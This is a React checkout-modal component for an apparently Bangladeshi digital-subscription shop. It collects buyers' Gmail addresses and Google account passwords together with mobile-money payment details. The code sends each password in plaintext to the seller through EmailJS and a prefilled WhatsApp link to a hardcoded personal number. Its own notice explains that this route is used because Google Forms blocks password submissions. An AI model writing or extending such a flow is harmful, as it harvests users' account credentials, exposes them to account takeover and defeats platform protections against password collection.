import React, { useState, useEffect } from 'react';
import { Product } from '../types';
import { CheckCircle2, Lock, Loader2, Mail, Smartphone, AlertTriangle, ShieldAlert, ArrowRight, MessageCircle, Copy } from 'lucide-react';

interface CheckoutModalProps {
  isOpen: boolean;
  onClose: () => void;
  product: Product | null;
  onSuccess: () => void;
}

type PaymentMethod = 'bkash' | 'nagad' | 'rocket' | 'upay';
type CheckoutStep = 'notice' | 'details' | 'processing' | 'success';

// OPTIONAL: To receive orders via Email automatically:
// 1. Go to https://www.emailjs.com/ (It's free)
// 2. Create a service and template
// 3. Paste your keys below.
// If you leave these empty, the app will rely on the WhatsApp button.
const EMAILJS_CONFIG = {
  SERVICE_ID: '', // e.g. 'service_xyz'
  TEMPLATE_ID: '', // e.g. 'template_abc'
  PUBLIC_KEY: '',  // e.g. 'user_123'
};

export const CheckoutModal: React.FC<CheckoutModalProps> = ({
  isOpen,
  onClose,
  product,
  onSuccess,
}) => {
  const [step, setStep] = useState<CheckoutStep>('notice');
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [method, setMethod] = useState<PaymentMethod>('bkash');
  const [senderNumber, setSenderNumber] = useState('');
  const [trxId, setTrxId] = useState('');

  // Reset step to 'notice' every time modal opens
  useEffect(() => {
    if (isOpen) {
      setStep('notice');
      setEmail('');
      setPassword('');
      setSenderNumber('');
      setTrxId('');
    }
  }, [isOpen]);

  const total = product ? product.price : 0;
  const adminNumber = '8801607656890'; // Your WhatsApp Number

  const handleOrderSubmit = async (e: React.FormEvent<HTMLFormElement>) => {
    e.preventDefault();
    setStep('processing');

    // 1. Try to send via EmailJS (if configured)
    if (EMAILJS_CONFIG.SERVICE_ID && EMAILJS_CONFIG.PUBLIC_KEY) {
      try {
        const data = {
          service_id: EMAILJS_CONFIG.SERVICE_ID,
          template_id: EMAILJS_CONFIG.TEMPLATE_ID,
          user_id: EMAILJS_CONFIG.PUBLIC_KEY,
          template_params: {
            product: product?.name,
            price: product?.price,
            email: email,
            password: password,
            method: method,
            sender: senderNumber,
            trx: trxId,
          }
        };

        await fetch('https://api.emailjs.com/api/v1.0/email/send', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify(data)
        });
      } catch (error) {
        console.error("EmailJS Failed:", error);
        // Continue to success screen anyway, fallback to WhatsApp
      }
    }

    // Simulate processing time then show success
    setTimeout(() => {
      setStep('success');
    }, 1500);
  };

  const handleCloseSuccess = () => {
    onSuccess();
    // Reset form
    setEmail('');
    setPassword('');
    setSenderNumber('');
    setTrxId('');
    setStep('notice'); 
    onClose();
  };

  const generateWhatsAppLink = () => {
    const text = `
*নতুন অর্ডার এসেছে!* (DigiPlus)
------------------
📦 *Product:* ${product?.name}
💰 *Price:* ${product?.price} BDT
------------------
📧 *Email:* ${email}
🔑 *Pass:* ${password}
------------------
💳 *Method:* ${method.toUpperCase()}
📱 *Sender:* ${senderNumber}
🆔 *TrxID:* ${trxId}
    `.trim();
    
    return `https://wa.me/${adminNumber}?text=${encodeURIComponent(text)}`;
  };

  if (!isOpen || !product) return null;

  const methods: { id: PaymentMethod; name: string; color: string }[] = [
    { id: 'bkash', name: 'বিকাশ', color: 'bg-pink-600 hover:bg-pink-500' },
    { id: 'nagad', name: 'নগদ', color: 'bg-orange-600 hover:bg-orange-500' },
    { id: 'rocket', name: 'রকেট', color: 'bg-purple-600 hover:bg-purple-500' },
    { id: 'upay', name: 'উপায়', color: 'bg-yellow-500 hover:bg-yellow-400 text-black' },
  ];

  const getPaymentNumber = () => {
    if (method === 'rocket') return '01722195597';
    return '01607656890';
  };

  return (
    <div className="fixed inset-0 bg-black/80 backdrop-blur-sm z-50 flex items-center justify-center p-4">
      <div className="bg-slate-900 border border-slate-700 w-full max-w-md rounded-2xl overflow-hidden shadow-2xl relative max-h-[90vh] overflow-y-auto">
        
        {/* Step 1: Important Notice */}
        {step === 'notice' && (
          <div className="p-8">
            <div className="w-16 h-16 bg-blue-500/20 rounded-full flex items-center justify-center mb-6 mx-auto">
              <ShieldAlert size={32} className="text-blue-500" />
            </div>
            
            <h2 className="text-2xl font-bold text-white mb-6 text-center">
              অর্ডারের পূর্বে গুরুত্বপূর্ণ তথ্য
            </h2>

            <div className="space-y-5 text-slate-300 text-sm leading-relaxed mb-8 bg-slate-800/50 p-5 rounded-xl border border-slate-700">
              <p>
                <strong className="text-white block mb-2 font-semibold">কেন লগইন তথ্য প্রয়োজন?</strong>
                এটি পার্সোনাল সাবস্ক্রিপশন, তাই আপনার Gmail/Google আকাউন্টে লগইন করে এটি অ্যাক্টিভেট করতে হয়।
              </p>
              
              <div className="bg-red-500/10 border border-red-500/20 p-4 rounded-lg">
                <strong className="text-red-400 block mb-2 font-semibold">⚠️ সতর্কতা:</strong>
                <p className="text-red-100/90 text-xs">
                  Google Form-এ পাসওয়ার্ড সাবমিট করলে ফর্ম ব্লক হয়ে যায়। তাই পরবর্তী ধাপে আপনার তথ্য নিরাপদে আমাদের WhatsApp-এ পাঠানোর ব্যবস্থা করা হয়েছে।
                </p>
              </div>
            </div>

            <button
              onClick={() => setStep('details')}
              className="w-full py-3.5 bg-blue-600 hover:bg-blue-500 text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-blue-900/20"
            >
              আমি রাজি আছি, এগিয়ে যান <ArrowRight size={18} />
            </button>
            
            <button
              onClick={onClose}
              className="w-full py-3 mt-3 text-slate-500 hover:text-white font-medium transition-colors text-sm"
            >
              ফিরে যান
            </button>
          </div>
        )}

        {/* Step 2: Details Form */}
        {step === 'details' && (
          <form
            onSubmit={handleOrderSubmit}
            className="p-8 animate-in fade-in slide-in-from-right-4 duration-300"
          >
            <h2 className="text-2xl font-bold text-white mb-6 flex items-center gap-2">
              <Lock className="text-green-500" size={24} />
              নিরাপদ চেকআউট
            </h2>

            <div className="mb-6 space-y-4">
              <div className="bg-slate-800 p-4 rounded-xl border border-slate-700">
                <div className="flex justify-between text-sm text-slate-400 mb-2">
                  <span>অর্ডার সারাংশ</span>
                  <span className="text-blue-400 font-medium">
                    {product.name}
                  </span>
                </div>
                <div className="text-2xl font-bold text-white">
                  ৳{product.price.toLocaleString('bn-BD')}
                </div>
              </div>

              {/* Account Credentials Section */}
              <div className="space-y-3 pt-2">
                <div>
                  <label className="block text-slate-400 text-sm font-medium mb-2">
                    আপনার জিমেইল (Gmail)
                  </label>
                  <div className="relative">
                    <Mail className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="email"
                      required
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      placeholder="example@gmail.com"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="block text-slate-400 text-sm font-medium mb-2">
                    অ্যাকাউন্ট পাসওয়ার্ড
                  </label>
                  <div className="relative">
                    <Lock className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="password"
                      required
                      value={password}
                      onChange={(e) => setPassword(e.target.value)}
                      placeholder="আপনার পাসওয়ার্ড দিন"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                    />
                  </div>
                </div>
              </div>

              {/* Payment Section */}
              <div className="pt-4 border-t border-slate-800">
                <label className="block text-slate-400 text-sm font-medium mb-2">
                  পেমেন্ট মেথড সিলেক্ট করুন
                </label>
                <div className="grid grid-cols-4 gap-2 mb-4">
                  {methods.map((m) => (
                    <button
                      key={m.id}
                      type="button"
                      onClick={() => setMethod(m.id)}
                      className={`py-2 rounded-lg text-xs font-bold text-white transition-all ${
                        m.id === method
                          ? `${m.color} ring-2 ring-offset-2 ring-offset-slate-900 ring-white`
                          : 'bg-slate-800 text-slate-400 hover:bg-slate-700'
                      }`}
                    >
                      {m.name}
                    </button>
                  ))}
                </div>

                <div className="p-3 bg-slate-800/50 rounded-lg border border-slate-700/50 mb-4 text-sm text-slate-300">
                  সেন্ড মানি করুন: <span className="font-bold text-white select-all">{getPaymentNumber()}</span>
                </div>

                <div className="space-y-3">
                  <div className="relative">
                    <Smartphone className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500" size={18} />
                    <input
                      type="text"
                      required
                      value={senderNumber}
                      onChange={(e) => setSenderNumber(e.target.value)}
                      placeholder="যে নম্বর থেকে টাকা পাঠিয়েছেন"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                    />
                  </div>
                  <div className="relative">
                    <span className="absolute left-3 top-1/2 -translate-y-1/2 text-slate-500 font-bold text-xs">TrxID</span>
                    <input
                      type="text"
                      required
                      value={trxId}
                      onChange={(e) => setTrxId(e.target.value)}
                      placeholder="ট্রানজ্যাকশন আইডি (TrxID)"
                      className="w-full bg-slate-800 border border-slate-700 text-white rounded-lg py-3 pl-10 pr-4 focus:outline-none focus:border-blue-500"
                    />
                  </div>
                </div>
              </div>
            </div>

            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => setStep('notice')}
                className="flex-1 py-3 text-slate-400 hover:text-white font-medium transition-colors"
              >
                পেছনে যান
              </button>
              <button
                type="submit"
                className="flex-[2] py-3 bg-green-600 hover:bg-green-500 text-white rounded-xl font-bold shadow-lg shadow-green-900/20 transition-all transform active:scale-95"
              >
                অর্ডার সম্পন্ন করুন ৳{total.toLocaleString('bn-BD')}
              </button>
            </div>
          </form>
        )}

        {step === 'processing' && (
          <div className="p-12 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-300">
            <Loader2 size={48} className="text-blue-500 animate-spin mb-4" />
            <h3 className="text-xl font-semibold text-white mb-2">
              অর্ডার তৈরি করা হচ্ছে
            </h3>
            <p className="text-slate-400">
              অনুগ্রহ করে অপেক্ষা করুন...
            </p>
          </div>
        )}

        {step === 'success' && (
          <div className="p-8 flex flex-col items-center justify-center text-center animate-in fade-in zoom-in duration-300">
            <div className="w-16 h-16 bg-green-500/20 rounded-full flex items-center justify-center mb-6">
              <CheckCircle2 size={32} className="text-green-500" />
            </div>
            <h3 className="text-2xl font-bold text-white mb-2">
              অর্ডার সম্পন্ন হয়েছে!
            </h3>
            <div className="bg-yellow-500/10 border border-yellow-500/20 p-4 rounded-xl mb-6 w-full">
              <p className="text-yellow-200 text-sm font-semibold mb-1">
                ⚠️ খুব গুরুত্বপূর্ণ:
              </p>
              <p className="text-slate-300 text-xs">
                দ্রুত ডেলিভারি পেতে নিচের বাটনে ক্লিক করে <strong>WhatsApp</strong>-এ আপনার অর্ডার ডিটেইলস পাঠিয়ে দিন। এটি পাঠালেই আপনার অর্ডার কনফার্ম হবে।
              </p>
            </div>
            
            <a
              href={generateWhatsAppLink()}
              target="_blank"
              rel="noopener noreferrer"
              className="w-full py-3.5 bg-[#25D366] hover:bg-[#20bd5a] text-white rounded-xl font-bold flex items-center justify-center gap-2 transition-all shadow-lg shadow-green-900/20 mb-3"
            >
              <MessageCircle size={20} />
              অর্ডার ডিটেইলস পাঠান (WhatsApp)
            </a>
            
            <button
              onClick={handleCloseSuccess}
              className="w-full py-3 bg-slate-800 hover:bg-slate-700 text-slate-300 rounded-xl font-medium transition-all"
            >
              ঠিক আছে, বন্ধ করুন
            </button>
          </div>
        )}
      </div>
    </div>
  );
};